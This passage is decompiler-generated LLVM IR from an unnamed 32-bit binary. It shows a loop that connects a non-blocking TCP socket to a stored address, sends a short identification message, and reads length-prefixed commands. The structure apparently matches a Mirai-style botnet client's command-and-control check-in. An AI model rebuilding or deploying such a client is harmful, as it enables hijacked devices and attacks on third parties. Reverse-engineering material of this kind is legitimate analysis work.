  %v17_8dd0 = phi i32 [ 1, %bb19 ], [ 0, %dec_label_pc_8d7c ], [ 1, %dec_label_pc_8d94 ], [ 0, %dec_label_pc_8dc8 ]
  %v2_8dd0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_8dd0, i32* @r4, align 4
  store i32 %v6_8c80, i32* %r5.global-to-local, align 4
  store i32 %v9_8c80, i32* @r6, align 4
  store i32 %v12_8c80, i32* @r7, align 4
  ret i32 %v17_8dd0

; uselistorder directives
  uselistorder i32 %v1_8d64, { 1, 0 }
  uselistorder i32 %v3_8c98, { 1, 2, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8dcc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8dc8, { 1, 0 }
  uselistorder label %dec_label_pc_8d60, { 1, 0, 2 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_8de4(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8de4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-1380 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-34 = alloca i8*, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-356 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_8de4 = load i32, i32* @r4, align 4
  store i32 %v3_8de4, i32* %stack_var_-32, align 4
  %v6_8de4 = load i32, i32* @r5, align 4
  %v2_8df0 = load i32, i32* %arg2, align 4
  store i32 %v2_8df0, i32* %r0.global-to-local, align 4
  %v1_8df4 = inttoptr i32 %v2_8df0 to i8*
  %v2_8df4 = call i32 @function_bafc(i8* %v1_8df4)
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_8e00 = call i32 @function_c0d4(i32 17, i32 1)
  store i32 %v2_8e00, i32* %r0.global-to-local, align 4
  %v1_8e04 = call i32 @function_84b4(i32 %v2_8e00)
  store i32 ptrtoint ([2 x i8]* @global_var_e210.88 to i32), i32* %r0.global-to-local, align 4
  %v2_8e0c = call i32 @function_b854(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_e210.88, i32 0, i32 0))
  store i32 %v2_8e0c, i32* %r0.global-to-local, align 4
  %v1_8e10 = call i32 @function_af7c(i32 %v2_8e0c)
  store i32 %v1_8e10, i32* %r0.global-to-local, align 4
  store i32 %v1_8e10, i32* @global_var_17498.92, align 4
  %v1_8e1c = call i32 @function_8c80(i32 %v1_8e10)
  store i32 %v1_8e1c, i32* %r0.global-to-local, align 4
  store i32 %v1_8e1c, i32* @r5, align 4
  %v2_8e20 = icmp eq i32 %v1_8e1c, 0
  br i1 %v2_8e20, label %dec_label_pc_8e28, label %dec_label_pc_8e78

dec_label_pc_8e28:                                ; preds = %dec_label_pc_8de4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8e2c = call i32 @function_81cc(i32 2)
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8e34 = call i32 @function_83d0(i32 2)
  store i32 %v1_8e34, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8e40 = call i32 @function_83d0(i32 2)
  store i32 %v1_8e40, i32* @r0, align 4
  %v0_8e44 = call i32 @function_ab0c()
  %v0_8e48 = load i32, i32* @r4, align 4
  store i32 %v0_8e48, i32* %r1.global-to-local, align 4
  store i32 %v0_8e44, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_8e54 = inttoptr i32 %v0_8e48 to i32*
  %v4_8e54 = call i32 @function_bb28(i32 1, i32* %v3_8e54, i32 %v0_8e44)
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_e4dc.99 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_8e64 = call i32 @function_bb28(i32 1, i32* nonnull @global_var_e4dc.99, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8e6c = call i32 @function_82cc(i32 2)
  %v0_8e70 = load i32, i32* @r5, align 4
  store i32 %v0_8e70, i32* %r0.global-to-local, align 4
  %v1_8e74 = call i32 @function_c798(i32 %v0_8e70)
  store i32 %v1_8e74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e78

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8de4, %dec_label_pc_8e28
  %v0_8e78 = call i32 @function_9444()
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8e80 = call i32 @function_81cc(i32 1)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8e88 = call i32 @function_83d0(i32 1)
  store i32 %v1_8e88, i32* @r4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8e94 = call i32 @function_83d0(i32 1)
  store i32 %v1_8e94, i32* @r0, align 4
  %v0_8e98 = call i32 @function_ab0c()
  %v0_8e9c = load i32, i32* @r4, align 4
  store i32 %v0_8e9c, i32* %r1.global-to-local, align 4
  store i32 %v0_8e98, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_8ea8 = inttoptr i32 %v0_8e9c to i32*
  %v4_8ea8 = call i32 @function_bb28(i32 1, i32* %v3_8ea8, i32 %v0_8e98)
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_e4dc.99 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_8eb8 = call i32 @function_bb28(i32 1, i32* nonnull @global_var_e4dc.99, i32 1)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8ec0 = call i32 @function_82cc(i32 1)
  store i32 %v1_8ec0, i32* %r0.global-to-local, align 4
  %v0_8ec4 = call i32 @function_b8ac()
  store i32 %v0_8ec4, i32* %r0.global-to-local, align 4
  %v5_8ecc = icmp sgt i32 %v0_8ec4, 0
  br i1 %v5_8ecc, label %dec_label_pc_9364, label %dec_label_pc_8ed0

dec_label_pc_8ed0:                                ; preds = %dec_label_pc_8e78
  %v1_8ed0 = call i32 @function_baa4(i32 %v0_8ec4)
  store i32 %v1_8ed0, i32* @r5, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8edc = call i32 @function_b880(i32 0)
  %v2_8ee0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_8ee0, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8ee8 = call i32 @function_b880(i32 2)
  %v2_8eec = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_8eec, i32* @r4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_8ef4 = call i32 @function_b880(i32 1)
  store i32 32, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_8eec, i32* %r0.global-to-local, align 4
  %v3_8f04 = call i32 @function_aba4(i32 %v2_8eec, i32 0, i32 32)
  store i32 ptrtoint ([4 x i8]* @global_var_e2f0.101 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_8eec, i32* @r0, align 4
  %v3_8f10 = call i32 @function_ab78(i32 %v2_8eec, i32 ptrtoint ([4 x i8]* @global_var_e2f0.101 to i32))
  store i32 %v3_8f10, i32* %r0.global-to-local, align 4
  %v0_8f14 = call i32 @function_939c()
  store i32 %v0_8f14, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_8f1c = call i32 @function_b5dc(i32 %v0_8f14, i32 3)
  %v1_8f20 = add i32 %v2_8f1c, 1
  %v1_8f24 = urem i32 %v1_8f20, 256
  store i32 %v1_8f24, i32* %r0.global-to-local, align 4
  %v1_8f28 = call i32 @function_9ba0(i32 %v1_8f24)
  %v0_8f30 = load i32, i32* @r5, align 4
  store i32 %v0_8f30, i32* %r1.global-to-local, align 4
  %v2_8f34 = load i32, i32* @global_var_172a0.90, align 4
  store i32 %v2_8f34, i32* %r0.global-to-local, align 4
  %v2_8f38 = call i32 @function_a9e0(i32 %v2_8f34, i32 %v0_8f30)
  store i32 %v2_8f38, i32* %r0.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  %v2_8f4c = ptrtoint i32* %stack_var_-228 to i32
  %v2_8f6c = ptrtoint i32* %stack_var_-356 to i32
  %v2_8ffc = ptrtoint i32* %stack_var_-68 to i32
  %v3_900c = bitcast i32* %stack_var_-68 to %sockaddr*
  %v2_9054 = ptrtoint i32* %stack_var_-32 to i32
  %v2_9094 = ptrtoint i32* %stack_var_-52 to i32
  %v2_90ec = ptrtoint i8** %stack_var_-34 to i32
  %v4_90f8 = bitcast i8** %stack_var_-34 to i32*
  %v2_92cc = ptrtoint i32* %stack_var_-1380 to i32
  %v2_9150 = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_8f40

dec_label_pc_8f40:                                ; preds = %dec_label_pc_92e8, %bb, %dec_label_pc_8f90, %dec_label_pc_9208, %dec_label_pc_91fc, %dec_label_pc_9190, %dec_label_pc_9070, %dec_label_pc_935c, %dec_label_pc_91e8, %dec_label_pc_9188, %dec_label_pc_8ed0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8f44

dec_label_pc_8f44:                                ; preds = %dec_label_pc_8f44, %dec_label_pc_8f40
  %v1_8f50 = phi i32 [ %v1_8f54, %dec_label_pc_8f44 ], [ 0, %dec_label_pc_8f40 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8f50 = add i32 %v1_8f50, %v2_8f4c
  %v4_8f50 = inttoptr i32 %v3_8f50 to i32*
  store i32 0, i32* %v4_8f50, align 4
  %v0_8f54 = load i32, i32* %r2.global-to-local, align 4
  %v1_8f54 = add i32 %v0_8f54, 4
  store i32 %v1_8f54, i32* %r2.global-to-local, align 4
  %v7_8f58 = icmp eq i32 %v1_8f54, 128
  br i1 %v7_8f58, label %dec_label_pc_8f60, label %dec_label_pc_8f44

dec_label_pc_8f60:                                ; preds = %dec_label_pc_8f44
  %v0_8f60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_8f60, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8f64

dec_label_pc_8f64:                                ; preds = %dec_label_pc_8f64, %dec_label_pc_8f60
  %v1_8f70 = phi i32 [ %v1_8f74, %dec_label_pc_8f64 ], [ %v0_8f60, %dec_label_pc_8f60 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_8f70 = add i32 %v1_8f70, %v2_8f6c
  %v4_8f70 = inttoptr i32 %v3_8f70 to i32*
  store i32 0, i32* %v4_8f70, align 4
  %v0_8f74 = load i32, i32* %r2.global-to-local, align 4
  %v1_8f74 = add i32 %v0_8f74, 4
  store i32 %v1_8f74, i32* %r2.global-to-local, align 4
  %v7_8f78 = icmp eq i32 %v1_8f74, 128
  br i1 %v7_8f78, label %dec_label_pc_8f80, label %dec_label_pc_8f64

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f64
  store i32 ptrtoint (i32* @global_var_172a4.104 to i32), i32* @r6, align 4
  %v2_8f84 = load i32, i32* @global_var_172a4.104, align 4
  %v3_8f88 = icmp eq i32 %v2_8f84, -1
  br i1 %v3_8f88, label %dec_label_pc_8f90, label %dec_label_pc_9010

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_8f98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_8f98, i32* %r2.global-to-local, align 4
  %v3_8f9c = call i32 @function_c0a8(i32 2, i32 1, i32 %v0_8f98)
  store i32 %v3_8f9c, i32* %r0.global-to-local, align 4
  %v7_8fa0 = icmp eq i32 %v3_8f9c, -1
  store i32 %v3_8f9c, i32* @r4, align 4
  %v1_8fa8 = load i32, i32* @r6, align 4
  %v2_8fa8 = inttoptr i32 %v1_8fa8 to i32*
  store i32 %v3_8f9c, i32* %v2_8fa8, align 4
  br i1 %v7_8fa0, label %dec_label_pc_8f40, label %dec_label_pc_8fb0

dec_label_pc_8fb0:                                ; preds = %dec_label_pc_8f90
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8fb4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_8fb4, i32* @r2, align 4
  %v2_8fb8 = call i32 @function_b790(i32 %v3_8f9c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_8fc0 = or i32 %v2_8fb8, 2048
  store i32 %v1_8fc0, i32* @r2, align 4
  %v0_8fc4 = load i32, i32* @r4, align 4
  store i32 %v0_8fc4, i32* %r0.global-to-local, align 4
  %v2_8fc8 = call i32 @function_b790(i32 %v0_8fc4, i32 4)
  store i8 1, i8* bitcast (i8** @global_var_17428.106 to i8*), align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_8ff8 = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_8ff8, i32* %r0.global-to-local, align 4
  store i32 %v2_8ffc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_900c = call i32 @function_bf38(i32 %v2_8ff8, %sockaddr* %v3_900c, i32 16)
  store i32 %v4_900c, i32* %r0.global-to-local, align 4
  %v2_901c.pre = load i32, i32* @global_var_172a4.104, align 4
  br label %dec_label_pc_9010

dec_label_pc_9010:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8fb0
  %v0_9060 = phi i32 [ %v2_8f84, %dec_label_pc_8f80 ], [ %v2_901c.pre, %dec_label_pc_8fb0 ]
  %v2_9014 = load i8, i8* bitcast (i8** @global_var_17428.106 to i8*), align 4
  %v2_9018 = icmp eq i8 %v2_9014, 0
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  %v3_9050 = udiv i32 %v0_9060, 32
  store i32 %v2_9054, i32* %r2.global-to-local, align 4
  %v4_9058 = mul nuw nsw i32 %v3_9050, 4
  %v5_9058 = add i32 %v4_9058, %v2_9054
  store i32 %v5_9058, i32* %r0.global-to-local, align 4
  br i1 %v2_9018, label %dec_label_pc_904c, label %dec_label_pc_9024

dec_label_pc_9024:                                ; preds = %dec_label_pc_9010
  %v1_9034 = add i32 %v5_9058, -324
  %v2_9034 = inttoptr i32 %v1_9034 to i32*
  %v3_9034 = load i32, i32* %v2_9034, align 4
  %v1_9038 = urem i32 %v0_9060, 32
  store i32 %v1_9038, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_9040 = shl i32 1, %v1_9038
  %v8_9040 = or i32 %v3_9034, %v7_9040
  store i32 %v8_9040, i32* %v2_9034, align 4
  br label %dec_label_pc_9070

dec_label_pc_904c:                                ; preds = %dec_label_pc_9010
  %v1_905c = add i32 %v5_9058, -196
  %v2_905c = inttoptr i32 %v1_905c to i32*
  %v3_905c = load i32, i32* %v2_905c, align 4
  %v1_9060 = urem i32 %v0_9060, 32
  store i32 %v1_9060, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_9068 = shl i32 1, %v1_9060
  %v8_9068 = or i32 %v3_905c, %v7_9068
  store i32 %v8_9068, i32* %v2_905c, align 4
  br label %dec_label_pc_9070

dec_label_pc_9070:                                ; preds = %dec_label_pc_9024, %dec_label_pc_904c
  store i32 ptrtoint (i32* @global_var_172a4.104 to i32), i32* @r4, align 4
  %v2_9078 = load i32, i32* @global_var_172a4.104, align 4
  store i32 0, i32* @lr, align 4
  store i32 10, i32* %stack_var_-52, align 4
  %v1_9098 = add i32 %v2_9078, 1
  store i32 %v1_9098, i32* %r0.global-to-local, align 4
  store i32 %v2_8f4c, i32* %r1.global-to-local, align 4
  store i32 %v2_8f6c, i32* %r2.global-to-local, align 4
  %v5_90ac = call i32 @function_ba74(i32 %v1_9098, i32 %v2_8f4c, i32 %v2_8f6c, i32 0, i32 %v2_9094)
  store i32 %v5_90ac, i32* %r0.global-to-local, align 4
  %v8_90b0 = icmp eq i32 %v5_90ac, -1
  br i1 %v8_90b0, label %dec_label_pc_8f40, label %dec_label_pc_90bc

dec_label_pc_90bc:                                ; preds = %dec_label_pc_9070
  %v6_90ac = trunc i32 %v5_90ac to i8
  %v3_90bc = icmp eq i8 %v6_90ac, 0
  br i1 %v3_90bc, label %dec_label_pc_90c4, label %dec_label_pc_90fc

dec_label_pc_90c4:                                ; preds = %dec_label_pc_90bc
  %v0_90c4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_90c4, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v6_90d0 = inttoptr i32 %v5_90ac to i8*
  store i8* %v6_90d0, i8** %stack_var_-34, align 4
  %v2_90d4 = call i32 @function_b6a8(i32 %v0_90c4, i32 6)
  store i32 %v2_90d4, i32* %r0.global-to-local, align 4
  %v2_90d8 = icmp eq i32 %v2_90d4, 0
  %v0_90dc = load i32, i32* %sb.global-to-local, align 4
  %v1_90dc = add i32 %v0_90dc, 1
  store i32 %v1_90dc, i32* %sb.global-to-local, align 4
  br i1 %v2_90d8, label %dec_label_pc_90e4, label %dec_label_pc_90fc

dec_label_pc_90e4:                                ; preds = %dec_label_pc_90c4
  %v2_90e8 = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_90e8, i32* %r0.global-to-local, align 4
  store i32 %v2_90ec, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_90f8 = call i32 @function_c04c(i32 %v2_90e8, i32* nonnull %v4_90f8, i32 2, i32 16384)
  store i32 %v5_90f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_90fc

dec_label_pc_90fc:                                ; preds = %dec_label_pc_90c4, %dec_label_pc_90bc, %dec_label_pc_90e4
  store i32 ptrtoint (i8** @global_var_17428.106 to i32), i32* %r1.global-to-local, align 4
  %v2_9100 = load i8, i8* bitcast (i8** @global_var_17428.106 to i8*), align 4
  %v3_9100 = zext i8 %v2_9100 to i32
  store i32 %v3_9100, i32* @r5, align 4
  %v2_9104 = icmp eq i8 %v2_9100, 0
  store i32 ptrtoint (i32* @global_var_172a4.104 to i32), i32* @r7, align 4
  %v2_91fc = load i32, i32* @global_var_172a4.104, align 4
  br i1 %v2_9104, label %dec_label_pc_91fc, label %dec_label_pc_9110

dec_label_pc_9110:                                ; preds = %dec_label_pc_90fc
  store i32 %v2_91fc, i32* %r0.global-to-local, align 4
  store i32 %v2_9054, i32* %r2.global-to-local, align 4
  %v3_911c = udiv i32 %v2_91fc, 32
  %v4_9120 = mul nuw nsw i32 %v3_911c, 4
  %v5_9120 = add i32 %v4_9120, %v2_9054
  %v1_9124 = add i32 %v5_9120, -324
  %v2_9124 = inttoptr i32 %v1_9124 to i32*
  %v3_9124 = load i32, i32* %v2_9124, align 4
  %v1_9128 = urem i32 %v2_91fc, 32
  store i32 %v1_9128, i32* %r2.global-to-local, align 4
  %v6_912c = ashr i32 %v3_9124, %v1_9128
  %v1_9134 = urem i32 %v6_912c, 2
  %v2_9134 = icmp eq i32 %v1_9134, 0
  store i8 0, i8* bitcast (i8** @global_var_17428.106 to i8*), align 4
  br i1 %v2_9134, label %dec_label_pc_9178, label %dec_label_pc_9140

dec_label_pc_9140:                                ; preds = %dec_label_pc_9110
  store i32 4, i32* @r4, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-44, align 4
  %v6_9164 = call i32 @function_bf90(i32 %v2_91fc, i32 1, i32 4, i32* nonnull %stack_var_-40, i32 %v2_9150)
  store i32 %v6_9164, i32* %r0.global-to-local, align 4
  %v3_9168 = load i32, i32* %stack_var_-40, align 4
  %v2_916c = icmp eq i32 %v3_9168, 0
  br i1 %v2_916c, label %dec_label_pc_9190, label %dec_label_pc_9174

dec_label_pc_9174:                                ; preds = %dec_label_pc_9140
  %v2_9174 = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_9174, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9178

dec_label_pc_9178:                                ; preds = %dec_label_pc_9110, %dec_label_pc_9174
  %v0_9178 = phi i32 [ %v2_91fc, %dec_label_pc_9110 ], [ %v2_9174, %dec_label_pc_9174 ]
  %v1_9178 = call i32 @function_b880(i32 %v0_9178)
  %v1_9180 = load i32, i32* @r7, align 4
  %v2_9180 = inttoptr i32 %v1_9180 to i32*
  store i32 -1, i32* %v2_9180, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9188

dec_label_pc_9188:                                ; preds = %dec_label_pc_9304, %dec_label_pc_92ac, %dec_label_pc_9178
  %v0_9188 = load i32, i32* %r0.global-to-local, align 4
  %v1_9188 = call i32 @function_c82c(i32 %v0_9188)
  store i32 %v1_9188, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f40

dec_label_pc_9190:                                ; preds = %dec_label_pc_9140
  store i32 %v2_8eec, i32* @r0, align 4
  %v0_919c = call i32 @function_ab0c()
  store i32 %v0_919c, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_919c, 16777216
  %v1_91a0 = sdiv i32 %sext, 16777216
  %v7_91a0 = inttoptr i32 %v1_91a0 to i8*
  store i8* %v7_91a0, i8** %stack_var_-34, align 4
  %v2_91a4 = call i32 @function_af7c(i32 %v1_91a0)
  %v0_91ac = load i32, i32* @r4, align 4
  store i32 %v0_91ac, i32* %r2.global-to-local, align 4
  store i32 %v2_91a4, i32* @global_var_17498.92, align 4
  store i32 ptrtoint (i32* @global_var_e2f4.109 to i32), i32* %r1.global-to-local, align 4
  %v2_91bc = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_91bc, i32* %r0.global-to-local, align 4
  %v5_91c0 = call i32 @function_c04c(i32 %v2_91bc, i32* nonnull @global_var_e2f4.109, i32 %v0_91ac, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_91cc = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_91cc, i32* %r0.global-to-local, align 4
  store i32 %v2_90ec, i32* %r1.global-to-local, align 4
  %v5_91d8 = call i32 @function_c04c(i32 %v2_91cc, i32* %v4_90f8, i32 1, i32 16384)
  store i32 %v5_91d8, i32* %r0.global-to-local, align 4
  %v3_91dc = load i8*, i8** %stack_var_-34, align 4
  %v4_91dc = ptrtoint i8* %v3_91dc to i32
  store i32 %v4_91dc, i32* %r2.global-to-local, align 4
  %v3_91e0 = icmp eq i8* %v3_91dc, null
  br i1 %v3_91e0, label %dec_label_pc_8f40, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_9190
  %v2_91e8 = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_91e8, i32* %r0.global-to-local, align 4
  store i32 %v2_8eec, i32* %r1.global-to-local, align 4
  %v6_91f4 = call i32 @function_c04c(i32 %v2_91e8, i32* nonnull %stack_var_-100, i32 %v4_91dc, i32 16384)
  store i32 %v6_91f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f40

dec_label_pc_91fc:                                ; preds = %dec_label_pc_90fc
  store i32 %v2_91fc, i32* @r4, align 4
  %v7_9200 = icmp eq i32 %v2_91fc, -1
  br i1 %v7_9200, label %dec_label_pc_8f40, label %dec_label_pc_9208

dec_label_pc_9208:                                ; preds = %dec_label_pc_91fc
  store i32 %v2_9054, i32* %r2.global-to-local, align 4
  %v3_9210 = udiv i32 %v2_91fc, 32
  %v4_9214 = mul nuw nsw i32 %v3_9210, 4
  %v5_9214 = add i32 %v4_9214, %v2_9054
  %v1_9218 = add i32 %v5_9214, -196
  %v2_9218 = inttoptr i32 %v1_9218 to i32*
  %v3_9218 = load i32, i32* %v2_9218, align 4
  %v1_921c = urem i32 %v2_91fc, 32
  store i32 %v1_921c, i32* %r2.global-to-local, align 4
  %v6_9220 = ashr i32 %v3_9218, %v1_921c
  %v1_9224 = urem i32 %v6_9220, 2
  %v2_9224 = icmp eq i32 %v1_9224, 0
  br i1 %v2_9224, label %dec_label_pc_8f40, label %dec_label_pc_922c

dec_label_pc_922c:                                ; preds = %dec_label_pc_9208
  %v6_922c = inttoptr i32 %v3_9100 to i8*
  store i8* %v6_922c, i8** %stack_var_-34, align 4
  %v0_9234 = call i32 @function_bdd4()
  %v0_9240 = load i32, i32* @r5, align 4
  %v2_9240 = inttoptr i32 %v0_9234 to i32*
  store i32 %v0_9240, i32* %v2_9240, align 4
  store i32 %v0_9234, i32* @r6, align 4
  store i32 %v2_90ec, i32* %r1.global-to-local, align 4
  %v0_924c = load i32, i32* @r4, align 4
  store i32 %v0_924c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_9258 = call i32 @function_bfec(i32 %v0_924c, i32* %v4_90f8, i32 2, i32 16386)
  store i32 %v5_9258, i32* %r0.global-to-local, align 4
  %v7_925c = icmp eq i32 %v5_9258, -1
  br i1 %v7_925c, label %dec_label_pc_92e8, label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_922c
  %v2_9264 = icmp eq i32 %v5_9258, 0
  br i1 %v2_9264, label %dec_label_pc_9304, label %dec_label_pc_926c

dec_label_pc_926c:                                ; preds = %dec_label_pc_9264
  %v3_926c = load i8*, i8** %stack_var_-34, align 4
  %v4_926c = ptrtoint i8* %v3_926c to i32
  %v4_9274 = mul nuw nsw i32 %v3_9100, 256
  %v5_9274 = or i32 %v4_926c, %v4_9274
  store i32 %v5_9274, i32* %r2.global-to-local, align 4
  %v7_9274 = icmp eq i32 %v5_9274, 0
  br i1 %v7_9274, label %.thread3, label %dec_label_pc_928c

.thread3:                                         ; preds = %dec_label_pc_926c
  %v3_9278 = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v3_9278, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_935c

dec_label_pc_928c:                                ; preds = %dec_label_pc_926c
  %v1_928c = mul i32 %v4_926c, 256
  %v3_9290 = and i32 %v1_928c, 65280
  %v4_9294 = udiv i32 %v5_9274, 256
  %v5_9294 = or i32 %v3_9290, %v4_9294
  %v6_9294 = trunc i32 %v4_9294 to i8
  store i32 %v5_9294, i32* %r2.global-to-local, align 4
  %v4_9298 = udiv i32 %v5_9274, 65536
  %v3_929c = icmp slt i8 %v6_9294, 0
  %v7_92a4 = inttoptr i32 %v4_9294 to i8*
  store i8* %v7_92a4, i8** %stack_var_-34, align 4
  br i1 %v3_929c, label %dec_label_pc_92ac, label %dec_label_pc_92c4

dec_label_pc_92ac:                                ; preds = %dec_label_pc_928c
  %v2_92ac = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_92ac, i32* %r0.global-to-local, align 4
  %v1_92b0 = call i32 @function_b880(i32 %v2_92ac)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_92bc = load i32, i32* @r7, align 4
  %v2_92bc = inttoptr i32 %v1_92bc to i32*
  store i32 -1, i32* %v2_92bc, align 4
  br label %dec_label_pc_9188

dec_label_pc_92c4:                                ; preds = %dec_label_pc_928c
  %v0_92c4 = load i32, i32* @r5, align 4
  %v1_92c4 = load i32, i32* @r6, align 4
  %v2_92c4 = inttoptr i32 %v1_92c4 to i32*
  store i32 %v0_92c4, i32* %v2_92c4, align 4
  store i32 %v2_92cc, i32* @r4, align 4
  %v2_92d0 = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_92d0, i32* %r0.global-to-local, align 4
  store i32 %v2_92cc, i32* %r1.global-to-local, align 4
  %v9_92dc = call i32 @function_bfec(i32 %v2_92d0, i32* nonnull %stack_var_-1380, i32 %v4_9294, i32 16386)
  store i32 %v9_92dc, i32* %r0.global-to-local, align 4
  %v3_92e0 = icmp eq i32 %v9_92dc, -1
  br i1 %v3_92e0, label %dec_label_pc_92e8, label %dec_label_pc_92fc

dec_label_pc_92e8:                                ; preds = %dec_label_pc_92c4, %dec_label_pc_922c
  %v0_92e8 = load i32, i32* @r6, align 4
  %v1_92e8 = inttoptr i32 %v0_92e8 to i32*
  %v2_92e8 = load i32, i32* %v1_92e8, align 4
  %v7_92ec = icmp eq i32 %v2_92e8, 4
  br i1 %v7_92ec, label %dec_label_pc_8f40, label %bb

bb:                                               ; preds = %dec_label_pc_92e8
  %v8_92f0 = icmp eq i32 %v2_92e8, 11
  br i1 %v8_92f0, label %dec_label_pc_8f40, label %dec_label_pc_9304

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92c4
  %v2_92fc = icmp eq i32 %v9_92dc, 0
  br i1 %v2_92fc, label %dec_label_pc_9304, label %dec_label_pc_9320

dec_label_pc_9304:                                ; preds = %bb, %dec_label_pc_92fc, %dec_label_pc_9264
  store i32 ptrtoint (i32* @global_var_172a4.104 to i32), i32* @r4, align 4
  %v2_9308 = load i32, i32* @global_var_172a4.104, align 4
  store i32 %v2_9308, i32* %r0.global-to-local, align 4
  %v1_930c = call i32 @function_b880(i32 %v2_9308)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_9318 = load i32, i32* @r4, align 4
  %v2_9318 = inttoptr i32 %v1_9318 to i32*
  store i32 -1, i32* %v2_9318, align 4
  br label %dec_label_pc_9188

dec_label_pc_9320:                                ; preds = %dec_label_pc_92fc
